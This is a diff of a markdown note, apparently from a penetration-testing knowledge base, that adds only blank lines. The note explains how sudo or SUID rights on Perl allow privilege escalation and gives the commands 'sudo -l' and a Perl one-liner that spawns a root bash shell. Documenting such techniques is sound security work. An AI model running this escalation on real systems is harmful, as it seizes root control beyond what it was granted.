@@ -35,9 +35,17 @@ In some instances, a user may need to run Perl commands as root. This is often i
 
 In some instances, a user may need to run Perl commands as root. This is often implemented by giving the user permission to use sudo to execute Perl, or Perl itself may be configured with SUID rights. Both situations introduce a privilege escalation vulnerability,  as attackers can use it to spawn a shell as root, gaining full control over the system.
 
+
+
 # Instructions
 
+
+
 1. Check if the current user has been configured to run commands with sudo.
+
+
+
+
 
 **Command** ([[sudo -l]]):
 
@@ -45,13 +53,25 @@ In some instances, a user may need to run Perl commands as root. This is often i
 sudo -l
 ```
 
+
+
+
+
 2. Execute Perl using Sudo to spawn a shell.
+
+
+
+
 
 **Command** ([[Perl Spawn a Root Shell Using Sudo]]):
 
 ```bash
 sudo /usr/bin/perl -e 'system("/bin/bash")'
 ```
+
+
+
+
 
 ## Platforms
 
@@ -77,3 +97,5 @@ sudo /usr/bin/perl -e 'system("/bin/bash")'
 
 - [[privileges]]
 - [[Service Attacks]]
+
+
